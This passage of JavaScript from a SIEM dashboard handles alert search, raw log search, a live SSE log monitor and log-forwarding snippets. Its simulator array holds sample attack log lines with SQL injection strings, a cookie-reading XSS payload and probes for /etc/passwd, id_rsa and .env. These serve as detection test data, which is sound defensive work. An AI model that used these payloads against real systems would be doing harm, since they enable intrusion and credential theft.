    SIEM_SEARCH.quickFilters = SIEM_SEARCH.quickFilters.filter(function(qf) {
      return !(qf.field === field && qf.val.toLowerCase() === val.toLowerCase());
    });
    btn.classList.remove('active');
  } else {
    SIEM_SEARCH.quickFilters.push({ field: field, val: val });
    btn.classList.add('active');
  }

  siemRefreshAlertsView();
}

/** Clear the entire search bar and all quick-filters */
function siemClearSearch() {
  var input = document.getElementById('siemSearchInput');
  if (input) input.value = '';
  SIEM_SEARCH.tokens = [];
  SIEM_SEARCH.quickFilters = [];

  // Un-highlight all quick-filter buttons
  document.querySelectorAll('.siem-qf-btn').forEach(function(btn) {
    btn.classList.remove('active');
  });

  var clearBtn = document.getElementById('siemSearchClear');
  if (clearBtn) clearBtn.style.display = 'none';

  siemRefreshAlertsView();
  siemUpdateSearchHint();
}

/* ─── PATCH: wire filtered render into siemHandleResult ─────────────────── */
/* Override siemRenderAlertsTable to also seed the search cache correctly    */
var _origRenderAlertsTable = siemRenderAlertsTable;
siemRenderAlertsTable = function(alerts) {
  // Reset search state on new analysis
  SIEM_SEARCH.tokens      = [];
  SIEM_SEARCH.quickFilters = [];
  document.querySelectorAll('.siem-qf-btn').forEach(function(b) { b.classList.remove('active'); });
  var input = document.getElementById('siemSearchInput');
  if (input) input.value = '';
  var clearBtn = document.getElementById('siemSearchClear');
  if (clearBtn) clearBtn.style.display = 'none';

  // Store cache and render unfiltered first
  siemRenderAlertsTable._cache = alerts;
  _origRenderAlertsTable(alerts);
  siemUpdateSearchHint();
};

/* ─── INIT ───────────────────────────────────────────────────────────────── */

document.addEventListener('DOMContentLoaded', function() {
  siemInitDropZone();
  siemRenderPipe(null, []);
  siemSetProgress(0, 'Idle');
  siemUpdateSearchHint();
  // Move the match viewer to body so it can never be clipped by overflow:hidden
  setTimeout(siemInitSearchViewer, 100);
});

// Re-position on scroll or resize so dropdown stays aligned with search bar
window.addEventListener('resize', function() {
  var v = document.getElementById('siemLogMatchViewer');
  if (v && v.style.display !== 'none') siemPositionViewer();
});
// Capture scroll on ALL elements (true = capture phase) to catch the .view scroll container
document.addEventListener('scroll', function() {
  var v = document.getElementById('siemLogMatchViewer');
  if (v && v.style.display !== 'none') siemPositionViewer();
  else if (v) v.style.display = 'none'; // hide if scrolled away
}, true);

/* ─── RAW LOG SEARCH (search within pasted / loaded logs) ───────────────── */

var _LOG_SEARCH = {
  matches:    [],   // line indices of matching lines
  cursor:     -1,   // current highlighted match index
};

/**
 * One-time setup: move #siemLogMatchViewer to document.body so it is NEVER
 * clipped by any ancestor overflow:hidden. We position it absolutely using
 * getBoundingClientRect of the search bar each time it shows.
 */
function siemInitSearchViewer() {
  var viewer  = document.getElementById('siemLogMatchViewer');
  var anchor  = document.getElementById('siemLogSearchBar');
  if (!viewer || !anchor) return;
  // Move viewer to body
  viewer.parentNode && viewer.parentNode !== document.body && document.body.appendChild(viewer);
  // Override position styles
  viewer.style.position = 'fixed';
  viewer.style.zIndex   = '99999';
  viewer.style.left     = '0';
  viewer.style.top      = '0';
  viewer.style.right    = '';
  viewer.style.width    = '';
}

function siemPositionViewer() {
  var viewer = document.getElementById('siemLogMatchViewer');
  var anchor = document.getElementById('siemLogSearchBar');
  if (!viewer || !anchor) return;
  var rect = anchor.getBoundingClientRect();
  viewer.style.left   = rect.left + 'px';
  viewer.style.top    = (rect.bottom + 5) + 'px';
  viewer.style.width  = rect.width + 'px';
}

/**
 * Called on every keystroke in either the log textarea or the search input.
 * Filters the log lines and renders the match viewer.
 */
function siemLogSearchApply() {
  var query = (document.getElementById('siemLogSearchInput') || {}).value || '';
  var raw   = (document.getElementById('siemLogPaste')       || {}).value || '';

  var viewer  = document.getElementById('siemLogMatchViewer');
  var countEl = document.getElementById('siemLogSearchCount');

  if (!query.trim()) {
    _LOG_SEARCH.matches = [];
    _LOG_SEARCH.cursor  = -1;
    if (viewer)  { viewer.style.display = 'none'; viewer.innerHTML = ''; }
    if (countEl) countEl.textContent = '';
    return;
  }

  var lines   = raw.split('\n');
  var q       = query.toLowerCase();
  var matches = [];

  lines.forEach(function(line, idx) {
    if (line.toLowerCase().indexOf(q) !== -1) {
      matches.push(idx);
    }
  });

  var prevLen = _LOG_SEARCH.matches.length;
  _LOG_SEARCH.matches = matches;
  // Reset cursor to 0 on new search or when out of range
  if (_LOG_SEARCH.cursor < 0 || prevLen !== matches.length) _LOG_SEARCH.cursor = matches.length > 0 ? 0 : -1;
  if (_LOG_SEARCH.cursor >= matches.length) _LOG_SEARCH.cursor = matches.length - 1;

  // Update count badge
  if (countEl) {
    countEl.textContent = matches.length
      ? ((_LOG_SEARCH.cursor + 1) + ' / ' + matches.length + ' lines')
      : '0 matches';
    countEl.style.color = matches.length ? 'var(--accent)' : 'var(--red)';
  }

  // Build match viewer HTML
  if (viewer) {
    siemPositionViewer();
    if (!matches.length) {
      viewer.style.display = 'block';
      viewer.innerHTML = '<div class="siem-logmatch-none">No lines match "' + escHtml(query) + '"</div>';
      return;
    }

    var html = '';
    matches.forEach(function(lineIdx, mi) {
      var line     = lines[lineIdx];
      var isCursor = (mi === _LOG_SEARCH.cursor);
      var hi       = siemHighlightTerm(line, q);
      html += '<div class="siem-logmatch-row' + (isCursor ? ' siem-logmatch-active' : '') +
              '" data-mi="' + mi + '" onclick="siemLogMatchClick(' + mi + ')">' +
              '<span class="siem-logmatch-ln">' + (lineIdx + 1) + '</span>' +
              '<span class="siem-logmatch-text">' + hi + '</span>' +
              '</div>';
    });

    viewer.style.display = 'block';
    viewer.innerHTML = html;

    // Scroll active row into view inside the viewer
    setTimeout(function() {
      var active = viewer.querySelector('.siem-logmatch-active');
      if (active) active.scrollIntoView({ block: 'nearest' });
    }, 0);
  }

  // Scroll the textarea to the current match line
  siemScrollTextareaToLine(_LOG_SEARCH.cursor);
}

/** Highlight all occurrences of term inside a line (returns HTML) */
function siemHighlightTerm(line, term) {
  var safe = escHtml(line);
  var safeTerm = escHtml(term);
  // Case-insensitive replace — use a regex on the safe HTML
  var re = new RegExp('(' + safeTerm.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi');
  return safe.replace(re, '<mark class="siem-hl">$1</mark>');
}

/** Navigate matches with keyboard (Enter / arrow keys inside search input) */
function siemLogSearchNav(e) {
  if (e.key === 'Enter' || e.key === 'ArrowDown') { e.preventDefault(); siemLogSearchStep(1);  }
  if (e.key === 'ArrowUp')                         { e.preventDefault(); siemLogSearchStep(-1); }
  if (e.key === 'Escape')                           { siemLogSearchClear(); }
}

/** Move cursor by delta (+1 next, -1 prev) and refresh */
function siemLogSearchStep(delta) {
  var m = _LOG_SEARCH.matches;
  if (!m.length) return;
  _LOG_SEARCH.cursor = (_LOG_SEARCH.cursor + delta + m.length) % m.length;
  siemLogSearchApply();
}

/** Click a match row in the viewer */
function siemLogMatchClick(mi) {
  _LOG_SEARCH.cursor = mi;
  siemLogSearchApply();
}

/** Scroll the textarea to the given match cursor position */
function siemScrollTextareaToLine(matchCursor) {
  var ta = document.getElementById('siemLogPaste');
  if (!ta || _LOG_SEARCH.matches.length === 0 || matchCursor < 0) return;
  var lineIdx = _LOG_SEARCH.matches[matchCursor];
  var lines   = ta.value.split('\n');
  // Compute character offset of this line
  var offset = lines.slice(0, lineIdx).reduce(function(sum, l) { return sum + l.length + 1; }, 0);
  // Set selection to force scroll
  ta.focus();
  ta.setSelectionRange(offset, offset + (lines[lineIdx] || '').length);
  // Estimate scroll position
  var lineHeight = 16; // approx px
  var visHeight  = ta.clientHeight;
  ta.scrollTop   = Math.max(0, lineIdx * lineHeight - visHeight / 2);
}

/** Clear the raw log search */
function siemLogSearchClear() {
  var input = document.getElementById('siemLogSearchInput');
  if (input) input.value = '';
  _LOG_SEARCH.matches = [];
  _LOG_SEARCH.cursor  = -1;
  var viewer  = document.getElementById('siemLogMatchViewer');
  var countEl = document.getElementById('siemLogSearchCount');
  if (viewer)  { viewer.style.display = 'none'; viewer.innerHTML = ''; }
  if (countEl) countEl.textContent = '';
}

/* Close the viewer when clicking outside */
document.addEventListener('click', function(e) {
  var bar    = document.getElementById('siemLogSearchBar');
  var viewer = document.getElementById('siemLogMatchViewer');
  if (!viewer || viewer.style.display === 'none') return;
  if (bar && bar.contains(e.target)) return;
  if (viewer.contains(e.target)) return;
  viewer.style.display = 'none';
});

/* ─── LIVE LOG MONITOR ───────────────────────────────────────────────────── */

var _LIVE = {
  es:          null,      // EventSource
  connected:   false,
  simTimer:    null,
  simRunning:  false,
  simIndex:    0,
  sevCounts:   { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0 },
  lineCount:   0,
  alertCount:  0,
  ipCount:     0,
};

/* Realistic mixed attack log simulator */
var _SIM_LOGS = [
  '2024-03-15T09:00:01Z 203.0.113.10 "GET /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T09:00:02Z 203.0.113.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T09:00:03Z 203.0.113.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T09:00:04Z 203.0.113.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T09:00:05Z 203.0.113.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T09:00:06Z 10.0.0.77 "GET /search?q=\' OR 1=1-- HTTP/1.1" 200 - "sqlmap/1.7"',
  '2024-03-15T09:00:07Z 10.0.0.77 "GET /users?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 500 - "sqlmap/1.7"',
  '2024-03-15T09:00:08Z 172.16.0.99 "GET /wp-admin HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:09Z 172.16.0.99 "GET /.env HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:10Z 172.16.0.99 "GET /backup.zip HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:11Z 192.168.1.5 "GET /dashboard HTTP/1.1" 200 - "Mozilla/5.0"',
  '2024-03-15T09:00:12Z 172.16.0.99 "GET /.git/config HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:13Z 10.0.0.77 "POST /comment HTTP/1.1" 200 - "curl/7.0" payload=<script>alert(document.cookie)</script>',
  '2024-03-15T09:00:14Z 172.16.0.99 "GET /phpmyadmin HTTP/1.1" 403 - "nikto/2.1.6"',
  '2024-03-15T09:00:15Z 172.16.0.99 "GET /config.php HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:16Z 172.16.0.99 "GET /etc/passwd HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:17Z 172.16.0.99 "GET /id_rsa HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:18Z 203.0.113.10 "POST /login HTTP/1.1" 200 - "Mozilla/5.0"',
  '2024-03-15T09:00:19Z 10.0.0.55 "GET /api/users?id=1 UNION SELECT * FROM admin-- HTTP/1.1" 500 - "python-requests/2.28"',
  '2024-03-15T09:00:20Z 192.168.1.5 "GET /api/data HTTP/1.1" 200 - "Mozilla/5.0"',
];

/* Connect to SSE stream */
function siemLiveConnect() {
  if (_LIVE.connected) {
    siemLiveDisconnect();
    return;
  }

  var url = SIEM.backendUrl + '/siem/live/stream';
  _LIVE.es = new EventSource(url);

  _LIVE.es.addEventListener('connected', function(e) {
    _LIVE.connected = true;
    siemLiveSetStatus(true);
    var data = JSON.parse(e.data);
    _LIVE.lineCount  = data.lines  || 0;
    _LIVE.alertCount = data.alerts || 0;
    siemLiveUpdateStats();
    siemAddLog('Live stream connected.', 'ok');
    document.getElementById('siemLiveIngest').style.display   = 'block';
    document.getElementById('siemLiveFeedWrap').style.display = 'block';
    document.getElementById('siemLiveResetBtn').style.display = 'inline-flex';
  });

  _LIVE.es.addEventListener('alert', function(e) {
    var alert = JSON.parse(e.data);
    siemLiveAddAlertRow(alert);
    _LIVE.alertCount++;
    var sev = alert.severity || 'INFO';
    _LIVE.sevCounts[sev] = (_LIVE.sevCounts[sev] || 0) + 1;
    siemLiveUpdateStats();
    // Flash the dot
    siemLiveFlashDot(sev);
  });

  _LIVE.es.addEventListener('stats', function(e) {
    var data = JSON.parse(e.data);
    _LIVE.lineCount  = data.lines  || _LIVE.lineCount;
    _LIVE.alertCount = data.alerts || _LIVE.alertCount;
    siemLiveUpdateStats();
  });

  _LIVE.es.addEventListener('reset', function() {
    _LIVE.lineCount  = 0;
    _LIVE.alertCount = 0;
    _LIVE.ipCount    = 0;
    _LIVE.sevCounts  = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0 };
    var feed = document.getElementById('siemLiveFeed');
    if (feed) feed.innerHTML = '<div class="siem-live-feed-empty">Session reset — waiting for events…</div>';
    siemLiveUpdateStats();
    siemAddLog('Live session reset.', 'info');
  });

  _LIVE.es.onerror = function() {
    if (_LIVE.connected) {
      siemAddLog('Live stream disconnected — backend may be offline.', 'warn');
    }
    siemLiveSetStatus(false);
    _LIVE.connected = false;
  };

  var btn = document.getElementById('siemLiveConnectBtn');
  if (btn) btn.textContent = 'Connecting…';
}

function siemLiveDisconnect() {
  if (_LIVE.es) { _LIVE.es.close(); _LIVE.es = null; }
  if (_LIVE.simRunning) siemLiveStopSim();
  _LIVE.connected = false;
  siemLiveSetStatus(false);
  document.getElementById('siemLiveIngest').style.display   = 'none';
  document.getElementById('siemLiveFeedWrap').style.display = 'none';
  document.getElementById('siemLiveResetBtn').style.display = 'none';
  siemAddLog('Live stream disconnected.', 'info');
}

/* Send manually pasted lines to backend */
function siemLiveSend() {
  var ta = document.getElementById('siemLiveInput');
  if (!ta || !ta.value.trim()) return;
  var lines = ta.value.trim().split('\n').filter(function(l) { return l.trim(); });
  ta.value = '';

  fetch(SIEM.backendUrl + '/siem/live/ingest', {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ lines: lines }),
  })
  .then(function(r) { return r.json(); })
  .then(function(data) {
    _LIVE.lineCount += lines.length;
    siemLiveUpdateStats();
  })
  .catch(function() {
    siemAddLog('Live ingest failed — is the backend running?', 'warn');
  });
}

/* Start / stop the built-in log simulator */
function siemLiveToggleSim() {
  if (_LIVE.simRunning) {
    siemLiveStopSim();
  } else {
    siemLiveStartSim();
  }
}

function siemLiveStartSim() {
  if (!_LIVE.connected) {
    showToast('Connect the stream first.', 'warn');
    return;
  }
  _LIVE.simRunning = true;
  _LIVE.simIndex   = 0;
  var btn = document.getElementById('siemLiveSimBtn');
  if (btn) { btn.textContent = '⏹ Stop Simulator'; btn.classList.add('active'); }
  siemAddLog('Log simulator started.', 'info');
  siemLiveSimStep();
}

function siemLiveStopSim() {
  _LIVE.simRunning = false;
  clearTimeout(_LIVE.simTimer);
  var btn = document.getElementById('siemLiveSimBtn');
  if (btn) { btn.textContent = '▶ Start Simulator'; btn.classList.remove('active'); }
  siemAddLog('Log simulator stopped.', 'info');
}

function siemLiveSimStep() {
  if (!_LIVE.simRunning) return;
  var line = _SIM_LOGS[_LIVE.simIndex % _SIM_LOGS.length];
  // Timestamp injection so logs always look "now"
  var now = new Date().toISOString().slice(0, 19) + 'Z';
  line = line.replace(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z/, now);

  fetch(SIEM.backendUrl + '/siem/live/ingest', {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ line: line }),
  }).catch(function() {});

  _LIVE.simIndex++;
  var speed = parseInt(document.getElementById('siemLiveSimSpeed').value, 10) || 800;
  _LIVE.simTimer = setTimeout(siemLiveSimStep, speed);
}

/* Reset live session */
function siemLiveReset() {
  fetch(SIEM.backendUrl + '/siem/live/reset', { method: 'POST' }).catch(function() {});
}

/* Render a new alert row in the live feed */
function siemLiveAddAlertRow(alert) {
  var feed = document.getElementById('siemLiveFeed');
  if (!feed) return;

  // Remove empty placeholder
  var emp = feed.querySelector('.siem-live-feed-empty');
  if (emp) emp.remove();

  var cfg   = SEV_CONFIG[alert.severity] || SEV_CONFIG.INFO;
  var now   = new Date().toTimeString().slice(0, 8);
  var ip    = alert.ip       ? escHtml(alert.ip)               : 'N/A';
  var ep    = alert.endpoint ? escHtml(alert.endpoint.slice(0, 50)) : '—';
  var score = alert.risk_score || 0;

  var row = document.createElement('div');
  row.className = 'siem-live-row siem-live-row-new';
  row.innerHTML =
    '<span class="siem-live-row-ts">' + now + '</span>' +
    '<span class="siem-live-row-sev" style="color:' + cfg.color + '">' + cfg.icon + ' ' + escHtml(alert.severity) + '</span>' +
    '<span class="siem-live-row-type">' + escHtml(alert.type) + '</span>' +
    '<span class="siem-live-row-ip">' + ip + '</span>' +
    '<span class="siem-live-row-ep">' + ep + '</span>' +
    '<span class="siem-live-row-score" style="color:' + (score >= 75 ? 'var(--red)' : score >= 50 ? 'var(--amber)' : 'var(--green)') + '">' + score + '</span>';

  // Prepend (newest on top)
  feed.insertBefore(row, feed.firstChild);

  // Cap at 200 rows
  var rows = feed.querySelectorAll('.siem-live-row');
  if (rows.length > 200) feed.removeChild(feed.lastChild);

  // Remove animation class after it plays
  setTimeout(function() { row.classList.remove('siem-live-row-new'); }, 800);
}

/* Update live stat counters */
function siemLiveUpdateStats() {
  function set(id, val) {
    var el = document.getElementById(id);
    if (el) el.textContent = val;
  }
  set('siemLiveLines',  _LIVE.lineCount);
  set('siemLiveAlerts', _LIVE.alertCount);
  set('siemLiveCrit',   _LIVE.sevCounts.CRITICAL || 0);
  set('siemLiveHigh',   _LIVE.sevCounts.HIGH     || 0);
}

/* Set connected / disconnected visual state */
function siemLiveSetStatus(on) {
  var dot   = document.getElementById('siemLiveDot');
  var badge = document.getElementById('siemLiveBadge');
  var btn   = document.getElementById('siemLiveConnectBtn');

  if (dot) {
    dot.className = 'siem-live-dot' + (on ? ' siem-live-dot-on' : '');
  }
  if (badge) {
    badge.textContent = on ? 'LIVE' : 'OFFLINE';
    badge.style.background = on ? 'rgba(0,200,100,.15)' : 'rgba(255,90,90,.12)';
    badge.style.color      = on ? 'var(--green)' : 'var(--red)';
    badge.style.borderColor = on ? 'rgba(0,200,100,.3)' : 'rgba(255,90,90,.25)';
  }
  if (btn) {
    btn.textContent = on ? 'Disconnect' : 'Connect Stream';
    btn.style.background = on ? 'rgba(255,90,90,.12)' : '';
    btn.style.borderColor = on ? 'var(--red)' : '';
    btn.style.color = on ? 'var(--red)' : '';
  }
}

/* Flash the status dot on alert severity */
function siemLiveFlashDot(sev) {
  var dot = document.getElementById('siemLiveDot');
  if (!dot) return;
  var flashColor = sev === 'CRITICAL' ? 'var(--red)' : sev === 'HIGH' ? 'var(--coral)' : 'var(--amber)';
  dot.style.background = flashColor;
  dot.style.boxShadow  = '0 0 8px ' + flashColor;
  setTimeout(function() {
    dot.style.background = '';
    dot.style.boxShadow  = '';
  }, 400);
}

/* ═══════════════════════════════════════════════════════════════════════════
   SYSTEM LOG FORWARDING
   ══════════════════════════════════════════════════════════════════════════ */

var _FWD = {
  active: false,
  source: 'file',
  timer: null
};

/** Toggle the forwarding panel open/closed */
function siemToggleForward() {
  var body    = document.getElementById('siemForwardBody');
  var chevron = document.getElementById('siemForwardChevron');
  if (!body) return;
  var isOpen = body.style.display !== 'none';
  body.style.display = isOpen ? 'none' : 'block';
  if (chevron) chevron.classList.toggle('open', !isOpen);
}

/** Switch source tab */
function siemForwardTab(btn, src) {
  _FWD.source = src;
  // update tab active class
  var tabs = document.querySelectorAll('.siem-ftab');
  tabs.forEach(function(t) { t.classList.remove('active'); });
  if (btn) btn.classList.add('active');
  // show/hide source panels
  ['file','syslog','journal','custom'].forEach(function(s) {
    var el = document.getElementById('siemFSrc-' + s);
    if (el) el.style.display = s === src ? 'block' : 'none';
  });
  // update snippet
  siemForwardUpdateSnippet(src);
}

/** Build the command snippet for each source type */
function siemForwardUpdateSnippet(src) {
  var snippet = document.getElementById('siemFwdSnippet');
  var code    = document.getElementById('siemFwdCode');
  if (!snippet || !code) return;

  var backendBase = (typeof SIEM !== 'undefined' && SIEM.backendUrl)
    ? SIEM.backendUrl
    : 'http://localhost:5050';

  var snippetText = '';
  if (src === 'file') {
    var path = (document.getElementById('siemFwdFilePath') || {}).value || '/var/log/nginx/access.log';
    snippetText =
      '# Tail and forward a log file (Linux/macOS)\n' +
      'tail -F "' + path + '" | while read line; do\n' +
      '  curl -s -X POST ' + backendBase + '/siem/ingest \\\n' +
      '    -H "Content-Type: text/plain" --data-binary "$line" > /dev/null\n' +
      'done\n\n' +
      '# Windows PowerShell equivalent\n' +
      'Get-Content "' + path + '" -Wait | ForEach-Object {\n' +
      '  Invoke-WebRequest -Uri "' + backendBase + '/siem/ingest" -Method POST -Body $_\n' +
      '}';
  } else if (src === 'syslog') {
    var port = (document.getElementById('siemFwdSyslogPort') || {}).value || '514';
    snippetText =
      '# Forward syslog to ShadeParse (rsyslog)\n' +
      '# Add to /etc/rsyslog.conf :\n' +
      '*.* @127.0.0.1:' + port + ';RSYSLOG_SyslogProtocol23Format\n\n' +
      '# Or use socat to relay an existing UDP syslog stream:\n' +
      'socat UDP4-RECVFROM:' + port + ',fork UDP4-SENDTO:127.0.0.1:' + port;
  } else if (src === 'journal') {
    var unit  = (document.getElementById('siemFwdJournalUnit') || {}).value || '';
    var unitF = unit ? ' -u ' + unit : '';
    snippetText =
      '# Stream systemd journal to ShadeParse (Linux)\n' +
      'journalctl -f' + unitF + ' --output=json | while read line; do\n' +
      '  curl -s -X POST ' + backendBase + '/siem/ingest \\\n' +
      '    -H "Content-Type: application/json" --data-binary "$line" > /dev/null\n' +
      'done';
  } else {
    var url = (document.getElementById('siemFwdCustomUrl') || {}).value || backendBase + '/siem/ingest';
    snippetText =
      '# Logstash output config\n' +
      'output {\n' +
      '  http {\n' +
      '    url => "' + url + '"\n' +
      '    http_method => "post"\n' +
      '    format => "json"\n' +
      '  }\n' +
      '}\n\n' +
      '# Vector sink config\n' +
      '[sinks.shadeparse]\n' +
      'type = "http"\n' +
      'uri = "' + url + '"\n' +
      'encoding.codec = "json"';
  }

  code.textContent = snippetText;
  snippet.style.display = 'block';
}

/** Attempt to connect the log source */
function siemForwardStart() {
  var src  = _FWD.source;
  var valid = true;
  var msg  = '';

  if (src === 'file') {
    var path = (document.getElementById('siemFwdFilePath') || {}).value || '';
    if (!path.trim()) { valid = false; msg = 'Enter a file path.'; }
  } else if (src === 'syslog') {
    var port = parseInt((document.getElementById('siemFwdSyslogPort') || {}).value, 10);
    if (!port || port < 1 || port > 65535) { valid = false; msg = 'Enter a valid port (1–65535).'; }
  } else if (src === 'custom') {
    var url = (document.getElementById('siemFwdCustomUrl') || {}).value || '';
    if (!url.trim()) { valid = false; msg = 'Enter a webhook URL.'; }
  }

  var statusEl = document.getElementById('siemFwdStatus');
  if (!valid) {
    if (statusEl) { statusEl.textContent = '⚠ ' + msg; statusEl.className = 'siem-fwd-status error'; }
    return;
  }

  // Simulate connection attempt
  if (statusEl) { statusEl.textContent = 'Connecting…'; statusEl.className = 'siem-fwd-status'; }

  siemForwardUpdateSnippet(src);

  setTimeout(function() {
    _FWD.active = true;
    var badge = document.getElementById('siemForwardBadge');
    if (badge) { badge.textContent = 'ACTIVE'; badge.classList.add('active'); }
    if (statusEl) { statusEl.textContent = '✓ Source connected — forwarding to SIEM'; statusEl.className = 'siem-fwd-status'; }
    var startBtn = document.getElementById('siemFwdStartBtn');
    var stopBtn  = document.getElementById('siemFwdStopBtn');
    if (startBtn) startBtn.style.display = 'none';
    if (stopBtn)  stopBtn.style.display  = 'inline-flex';
    siemAddLog('Log forwarding started: source=' + src, 'ok');

    // If file/journal: simulate streaming lines into the live panel
    if (src === 'file' || src === 'journal') {
      siemForwardSimulateStream();
    }
  }, 900);
}

/** Simulate log lines arriving via forwarding (demo mode) */
function siemForwardSimulateStream() {
  if (_FWD.timer) clearInterval(_FWD.timer);
  _FWD.timer = setInterval(function() {
    if (!_FWD.active) { clearInterval(_FWD.timer); return; }
    var lines = _SIM_LOGS;
    var line  = lines[Math.floor(Math.random() * lines.length)];
    var ta = document.getElementById('siemLogPaste');
    if (ta) {
      ta.value = (ta.value ? ta.value + '\n' : '') + line;
      siemLogSearchApply();
    }
  }, 2000);
}

/** Disconnect the log source */
function siemForwardStop() {
  _FWD.active = false;
  if (_FWD.timer) { clearInterval(_FWD.timer); _FWD.timer = null; }
  var badge    = document.getElementById('siemForwardBadge');
  var statusEl = document.getElementById('siemFwdStatus');
  var startBtn = document.getElementById('siemFwdStartBtn');
  var stopBtn  = document.getElementById('siemFwdStopBtn');
  if (badge)    { badge.textContent = 'INACTIVE'; badge.classList.remove('active'); }
  if (statusEl) { statusEl.textContent = ''; }
  if (startBtn) startBtn.style.display = 'inline-flex';
  if (stopBtn)  stopBtn.style.display  = 'none';
  siemAddLog('Log forwarding disconnected.', 'info');
}

/** Ping the backend to test connectivity */
function siemForwardTest() {
  var statusEl = document.getElementById('siemFwdStatus');
  if (statusEl) { statusEl.textContent = 'Pinging backend…'; statusEl.className = 'siem-fwd-status'; }
  var url = (typeof SIEM !== 'undefined' && SIEM.backendUrl)
    ? SIEM.backendUrl + '/health'
    : null;
  if (!url) {
    setTimeout(function() {
      if (statusEl) { statusEl.textContent = '⚠ No backend configured — running in offline mode'; statusEl.className = 'siem-fwd-status error'; }
    }, 400);
    return;
  }
  fetch(url, { method: 'GET' })
    .then(function(r) {
      if (r.ok) {
        if (statusEl) { statusEl.textContent = '✓ Backend reachable (' + r.status + ')'; statusEl.className = 'siem-fwd-status'; }
      } else {
        if (statusEl) { statusEl.textContent = '⚠ Backend returned ' + r.status; statusEl.className = 'siem-fwd-status error'; }
      }
    })
    .catch(function() {
      if (statusEl) { statusEl.textContent = '✗ Cannot reach backend — check if siem_backend.py is running'; statusEl.className = 'siem-fwd-status error'; }
    });
}
